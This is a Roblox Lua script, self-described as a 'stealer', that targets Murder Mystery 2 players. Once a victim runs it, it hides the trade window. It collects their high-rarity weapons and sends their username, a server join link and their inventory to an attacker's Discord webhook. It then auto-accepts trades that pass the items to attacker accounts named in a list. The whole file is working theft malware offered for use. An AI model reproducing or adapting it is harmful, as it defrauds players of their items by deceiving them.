local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Evitar ejecución múltiple
if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1

local req = syn and syn.request or http_request or request
if not req then
    warn("No HTTP request method available!")
    return
end

-- Función para enviar webhook con thumbnail y emojis
local function SendWebhook(title, description, fields, prefix, thumbnail)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = thumbnail and {["url"]=thumbnail} or nil,
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = body
        })
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            gui.Enabled = false
        end)
        gui.Enabled = false
    end
end

-- Funciones de trade
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Preparar lista de armas
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local valueList = {
    -- Aquí pones manualmente:
    -- ["Nombre del arma"] = valor,
    -- ["Otra arma"] = 5000,
}
local weaponsToSend = {}

local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id, amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local rarityIndex = table.find(rarityTable, item.Rarity)
        local minIndex = table.find(rarityTable, min_rarity)
        if rarityIndex and rarityIndex >= minIndex then
            local value = valueList[item.ItemName] or 1
            if value >= min_value then
                table.insert(weaponsToSend, {Name=item.ItemName, DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
            end
        end
    end
end

-- Ordenar de mayor a menor valor
table.sort(weaponsToSend, function(a,b) return a.Value > b.Value end)

-- Calcular valor total
local totalValue = 0
for _, w in ipairs(weaponsToSend) do totalValue += w.Value * w.Amount end

-- Preparar webhook
local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
local fields = {
    {name="Victim", value=LocalPlayer.Name.." 😎", inline=true},
    {name="Enlaza para unirse:", value=joinLink.." 🔗", inline=false},
    {name="Inventario:", value="", inline=false},
    {name="Valor total del inventario:", value=tostring(totalValue).." 💰", inline=true}
}

for _, w in ipairs(weaponsToSend) do
    fields[3].value = fields[3].value..string.format("%s | Value: %s 💎\n", w.Name, w.Value)
end

local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
SendWebhook("💪MM2 Hit Ultra💯", "💰Revisa las armas obtenidas:", fields, prefix, thumbnailURL)

-- Trade: sistema intacto
local function doTrade(targetName)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local w = table.remove(weaponsToSend, 1)
                for _=1, w.Amount do addWeaponToTrade(w.DataID) end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Activación trade por chat solo para usuarios
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
